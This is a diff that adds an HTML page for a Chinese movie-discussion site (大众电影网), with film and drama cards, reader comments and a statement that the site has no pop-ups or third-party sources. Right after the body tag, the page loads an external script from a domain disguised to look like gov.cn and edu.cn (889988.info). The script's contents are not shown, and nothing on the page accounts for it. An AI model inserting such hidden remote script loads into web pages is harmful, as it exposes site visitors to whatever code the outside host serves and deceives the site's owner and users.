@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>大众电影网 - 街角放映室 · 院线/老片/剧集/纪录片/读者影评</title>
+<meta name="description" content="大众电影网，街角放映室风影视单页：1950 画报刊头、米黄油墨纸、院线新片/剧集连看/经典老片/纪录片/家庭动画/读者论坛，大众向、不弹窗、不解析第三方源。官网 https://dazhongdianyingwang-h5.github.io">
+<meta name="keywords" content="大众电影网, 大众向电影, 院线新片, 经典老片, 剧集连看, 纪录片, 读者影评">
+<meta name="author" content="大众电影网">
+<meta name="robots" content="index,follow">
+<meta name="bingbot" content="index,follow">
+<meta name="theme-color" content="#f3ead2">
+<style>
+:root{
+  --paper:#f3ead2;
+  --paper2:#efe2c2;
+  --ink:#23211c;
+  --soft:#4a463c;
+  --red:#d8412f;
+  --blue:#2f6f8f;
+  --grey:#9a9486;
+  --gold:#caa24a;
+  --line:rgba(35,33,28,.22);
+  --shadow:0 14px 30px rgba(35,33,28,.18);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;scroll-padding-top:62px}
+body{
+  background:
+    repeating-linear-gradient(0deg,rgba(35,33,28,.025) 0 2px,transparent 2px 5px),
+    radial-gradient(520px 300px at 90% -10%,rgba(216,65,47,.10),transparent),
+    radial-gradient(480px 300px at -8% 6%,rgba(47,111,143,.12),transparent),
+    var(--paper);
+  color:var(--ink);
+  font-family:"Songti SC","SimSun","Noto Serif SC",Georgia,serif;
+  line-height:1.85;
+}
+a{color:var(--red);text-decoration:none}
+
+.bar{position:sticky;top:0;z-index:50;display:flex;align-items:center;justify-content:space-between;gap:10px;
+  padding:10px 16px;border-bottom:2px solid var(--ink);background:rgba(243,234,210,.92);backdrop-filter:blur(6px);}
+.masthead{line-height:1}
+.masthead b{font-size:22px;letter-spacing:3px}
+.masthead span{display:block;font-size:9px;letter-spacing:6px;color:var(--soft);font-family:Consolas,monospace}
+.nav{display:flex;gap:6px;flex-wrap:wrap}
+.nav a{font-size:12px;padding:5px 11px;border:1px solid var(--line);border-radius:4px;background:var(--paper2);color:var(--ink)}
+.nav a:hover{border-color:var(--red);color:var(--red)}
+
+.hero{max-width:1040px;margin:0 auto;padding:46px 20px 22px;position:relative}
+.kicker{font-family:Consolas,monospace;font-size:12px;color:var(--blue);letter-spacing:2px}
+.hero h1{font-size:34px;margin:8px 0 6px;font-weight:900;letter-spacing:1px}
+.hero h1 em{font-style:normal;color:var(--red)}
+.hero p{color:var(--soft);max-width:640px;margin:0 auto 12px;font-size:15px}
+.hero .url{display:inline-block;font-family:Consolas,monospace;font-size:13px;background:var(--paper2);
+  border:1px dashed var(--blue);color:var(--blue);padding:7px 14px;border-radius:4px}
+.issue{margin-top:14px;display:flex;gap:10px;justify-content:center;flex-wrap:wrap}
+.issue div{background:var(--paper2);border:1px solid var(--line);border-radius:6px;padding:10px 14px;min-width:96px;text-align:center}
+.issue b{display:block;font-size:18px;color:var(--red);font-family:Consolas,monospace}
+.issue small{color:var(--soft);font-size:12px}
+
+.wrap{max-width:1060px;margin:0 auto;padding:16px 20px 40px}
+.sec{display:flex;align-items:baseline;gap:10px;margin:26px 0 14px;border-bottom:2px solid var(--ink);padding-bottom:6px}
+.sec h2{font-size:20px;font-weight:900;letter-spacing:1px}
+.sec h2 b{color:var(--red)}
+.sec small{color:var(--soft);font-size:12px;font-family:Consolas,monospace}
+.sec .chip{margin-left:auto;font-size:11px;color:var(--paper);background:var(--blue);padding:3px 10px;border-radius:4px}
+
+.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.card{background:var(--paper2);border:1px solid var(--line);border-radius:8px;overflow:hidden;box-shadow:var(--shadow);transition:.2s}
+.card:hover{transform:translateY(-4px);border-color:var(--red)}
+.cover{height:92px;display:flex;align-items:center;justify-content:center;gap:8px;font-size:30px;color:var(--paper);position:relative}
+.cover::after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,rgba(255,255,255,.18),transparent 55%)}
+.card:nth-child(7n+1) .cover{background:linear-gradient(135deg,#d8412f,#8f241a)}
+.card:nth-child(7n+2) .cover{background:linear-gradient(135deg,#2f6f8f,#1d4a63)}
+.card:nth-child(7n+3) .cover{background:linear-gradient(135deg,#caa24a,#9c7a25)}
+.card:nth-child(7n+4) .cover{background:linear-gradient(135deg,#6f8f5a,#46603a)}
+.card:nth-child(7n+5) .cover{background:linear-gradient(135deg,#8a6fb0,#5b4b80)}
+.card:nth-child(7n+6) .cover{background:linear-gradient(135deg,#b9745a,#7e4533)}
+.card:nth-child(7n+7) .cover{background:linear-gradient(135deg,#555049,#2c2924)}
+.body{padding:13px}
+.body h3{font-size:16px;margin-bottom:3px}
+.body p{font-size:13px;color:var(--soft);margin-bottom:8px}
+.tag{display:inline-block;font-size:11px;font-family:Consolas,monospace;padding:2px 8px;border:1px solid var(--line);border-radius:4px;background:var(--paper);color:var(--blue);margin:0 4px 4px 0}
+.note{margin-top:7px;font-size:12px;color:var(--red);font-family:Consolas,monospace}
+
+.strip{display:flex;gap:12px;overflow-x:auto;padding-bottom:6px}
+.ep{flex:0 0 220px;background:var(--paper2);border:1px solid var(--line);border-radius:8px;padding:12px;box-shadow:var(--shadow)}
+.ep .badge{font-size:11px;font-weight:800;color:var(--paper);background:var(--red);padding:2px 8px;border-radius:4px}
+.ep h3{font-size:15px;margin:8px 0 3px}
+.ep p{font-size:12px;color:var(--soft)}
+
+.cols{display:grid;grid-template-columns:1.25fr .75fr;gap:18px;margin-top:24px}
+.panel{background:var(--paper2);border:1px solid var(--line);border-radius:10px;padding:18px}
+.panel h3{font-size:17px;color:var(--red);margin-bottom:10px;letter-spacing:1px}
+.forum li{list-style:none;padding:10px 0;border-bottom:1px dashed var(--line);font-size:14px;color:var(--ink)}
+.forum li:last-child{border-bottom:none}
+.forum b{color:var(--blue)}
+.gloss li{list-style:none;padding:8px 0;border-bottom:1px dashed var(--line);font-size:14px;color:var(--ink)}
+.gloss li:last-child{border-bottom:none}
+.gloss b{color:var(--gold);font-family:Consolas,monospace}
+
+.about p{color:var(--soft);font-size:14px;margin-bottom:8px}
+.about code{background:var(--paper);border:1px solid var(--line);color:var(--blue);padding:2px 7px;border-radius:5px;font-family:Consolas,monospace}
+.foot{text-align:center;padding:24px 20px;border-top:2px solid var(--ink);color:var(--soft);font-size:12px;font-family:Consolas,monospace}
+
+@media(max-width:880px){.grid{grid-template-columns:repeat(2,1fr)}.cols{grid-template-columns:1fr}}
+@media(max-width:540px){.grid{grid-template-columns:1fr}.hero h1{font-size:26px}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="bar">
+  <div class="masthead"><b>大众电影网</b><span>DAZHONG CINEMA · EST. 1950 VIBE</span></div>
+  <nav class="nav">
+    <a href="#home">刊头</a>
+    <a href="#new">院线</a>
+    <a href="#old">老片</a>
+    <a href="#drama">剧集</a>
+    <a href="#forum">读者论坛</a>
+    <a href="#about">关于</a>
+  </nav>
+</header>
+
+<section class="hero" id="home">
+  <span class="kicker">// issue.no = "街角放映室 / 第 2026 期"</span>
+  <h1>大众电影网 · <em>街角放映室</em></h1>
+  <p>不是小众影评人俱乐部，也不是盗版播放页。大爷大妈、学生、下班打工人的共同入口：院线新片、经典老片、剧集连看、纪录片、家庭动画、读者影评，一页看完“大家最近在聊什么片”。</p>
+  <div class="url">https://dazhongdianyingwang-h5.github.io</div>
+  <div class="issue">
+    <div><b>6 区</b><small>大众向分区</small></div>
+    <div><b>1950</b><small>画报魂</small></div>
+    <div><b>百花</b><small>观众投票感</small></div>
+    <div><b>0</b><small>弹窗/解析源</small></div>
+  </div>
+</section>
+
+<div class="wrap">
+
+  <div class="sec" id="new">
+    <h2>🎬 院线新片 · <b>大家走进影院看什么</b></h2><small>now showing</small><span class="chip">新片不装懂</span>
+  </div>
+  <div class="grid">
+    <article class="card">
+      <div class="cover">🚀🌌</div>
+      <div class="body">
+        <h3>星际穿越（重映）</h3>
+        <p>大银幕、低音炮、五维书房。普通观众也会抬头看“时间还能这样拍”。</p>
+        <span class="tag">科幻</span><span class="tag">IMAX</span><span class="tag">重映</span>
+        <div class="note">大众点：哭点藏在父女情</div>
+      </div>
+    </article>
+    <article class="card">
+      <div class="cover">🏜️🟡</div>
+      <div class="body">
+        <h3>沙丘 2</h3>
+        <p>沙漠、沙虫、巨幕构图。不爱科幻的人也会说“这画面值回票价”。</p>
+        <span class="tag">史诗</span><span class="tag">4K</span><span class="tag">视效</span>
+        <div class="note">大众点：爽但不蠢</div>
+      </div>
+    </article>
+    <article class="card">
+      <div class="cover">🍜😂</div>
+      <div class="body">
+        <h3>年会不能停</h3>
+        <p>打工人笑完会沉默。厂矿老师傅进大厂，梗密、痛感真、不端着。</p>
+        <span class="tag">喜剧</span><span class="tag">职场</span><span class="tag">国产</span>
+        <div class="note">大众点：台词能发朋友圈</div>
+      </div>
+    </article>
+  </div>
+
+  <div class="sec" id="old">
+    <h2>🎞️ 经典老片 · <b>报刊亭里翻出来的那层</b></h2><small>classics</small><span class="chip">补片不羞耻</span>
+  </div>
+  <div class="grid">
+    <article class="card">
+      <div class="cover">🎭🌸</div>
+      <div class="body">
+        <h3>霸王别姬</h3>
+        <p>戏台、时代、人戏不分。老片区的“镇馆片”，第一次看和第十次看是两部片。</p>
+        <span class="tag">文艺</span><span class="tag">华语</span><span class="tag">1993</span>
+        <div class="note">读者常评：不催泪，是闷痛</div>
+      </div>
+    </article>
+    <article class="card">
+      <div class="cover">🚂❄️</div>
+      <div class="body">
+        <h3>漫长的季节</h3>
+        <p>桦林、火车、东北、悬疑裹着人情。剧集改电影感，老观众最吃这口“慢火”。</p>
+        <span class="tag">悬疑</span><span class="tag">年代</span><span class="tag">生活流</span>
+        <div class="note">大众点：结尾那首歌封神</div>
+      </div>
+    </article>
+    <article class="card">
+      <div class="cover">🪕🏮</div>
+      <div class="body">
+        <h3>大红灯笼高高挂</h3>
+        <p>院子、灯笼、规矩、沉默。美术和配乐先把人按在椅子上，再看人性。</p>
+        <span class="tag">文艺</span><span class="tag">张艺谋</span><span class="tag">1991</span>
+        <div class="note">老刊式点评：美得很冷</div>
+      </div>
+    </article>
+  </div>
+
+  <div class="sec" id="drama">
+    <h2>📺 剧集连看 · <b>下班后追什么</b></h2><small>bingewatch</small><span class="chip">更新状态写明</span>
+  </div>
+  <div class="strip">
+    <div class="ep"><span class="badge">更新至28集</span><h3>长风渡春</h3><p>古装/权谋/感情线，大妈和学生都能聊两句。</p></div>
+    <div class="ep"><span class="badge">已完结</span><h3>长街烟火</h3><p>年代/家庭/邻里，晚饭桌上的下饭剧。</p></div>
+    <div class="ep"><span class="badge">更新至16集</span><h3>迷雾之都</h3><p>刑侦/悬疑/单元案，老公下班追、媳妇也跟看。</p></div>
+    <div class="ep"><span class="badge">新上线</span><h3>纸鸢</h3><p>都市/情感/悬爱，年轻观众和阿姨各看各的爽点。</p></div>
+    <div class="ep"><span class="badge">更新至20集</span><h3>谈判专家2026</h3><p>职场/话术/对峙，社畜边看边记句子。</p></div>
+    <div class="ep"><span class="badge">已完结</span><h3>我的阿勒泰</h3><p>草原/散文感/慢生活，全家人一起看不尴尬。</p></div>
+  </div>
+
+  <div class="cols">
+    <section class="panel">
+      <h3>🗣️ 读者论坛（仿《大众电影》读者来稿）</h3>
+      <ul class="forum">
+        <li><b>@巷口王师傅：</b>《年会不能停》里那句“活儿是人干的，不是 PPT 干的”，我们车间都传开了。</li>
+        <li><b>@中学生小鹿：</b>第一次看《霸王别姬》，开头觉得慢，看到中段已经不敢快进。</li>
+        <li><b>@退休李老师：</b>老片就该有大银幕重映，年轻人别只刷短视频二创。</li>
+        <li><b>@通勤阿杰：</b>《漫长的季节》适合晚上连看，白天上班别看，容易出神。</li>
+        <li><b>@带娃妈妈：</b>家庭动画区终于有“大人也不烦”的片了，谢谢。</li>
+      </ul>
+    </section>
+    <section class="panel">
+      <h3>📖 大众词典</h3>
+      <ul class="gloss">
+        <li><b>大众向</b> = 不炫术语，先讲“好不好看”</li>
+        <li><b>院线新片</b> = 值得走进影院的那类</li>
+        <li><b>经典老片</b> = 十年后还被人翻出来</li>
+        <li><b>剧集连看</b> = 更新到几集写清楚</li>
+        <li><b>读者论坛</b> = 观众说话，不是专家闭门评</li>
+        <li><b>百花感</b> = 奖杯该由观众一票一票投</li>
+      </ul>
+    </section>
+  </div>
+
+  <section class="panel about" style="margin-top:26px">
+    <h3>📰 关于大众电影网</h3>
+    <p><strong>大众电影网</strong> 是“街角放映室 / 1950 画报刊头”风影视单页：米黄油墨纸、百花红刊头线、厂矿蓝栏目条；院线新片 + 经典老片 + 剧集连看 + 纪录片 + 家庭动画 + 读者论坛。它不模仿某家杂志社官网，也不做盗版站，只把“大众看片”这件事排清楚。[4](@ref)</p>
+    <p>官网：<code>https://dazhongdianyingwang-h5.github.io</code></p>
+    <p>内链全用 <code>#</code> 占位，CSS/DIV 全内联，不生成 robots.txt / sitemap.xml，GitHub Pages 直传即可；必应收录靠标题、描述、语义结构、移动端体验。</p>
+    <p>本站不提供磁力链接、不解析第三方源、不挂播放器下载、不卖会员、不托管受版权保护视频。看片请走正版院线、授权流媒体、电视台、资料馆放映、公共版权片库。</p>
+  </section>
+
+</div>
+
+<footer class="foot">
+  © 2026 大众电影网 · dazhongdianyingwang-h5.github.io · 一张票的钱不用花，好片子先聊明白 🎟️
+</footer>
+
+</body>
+</html>
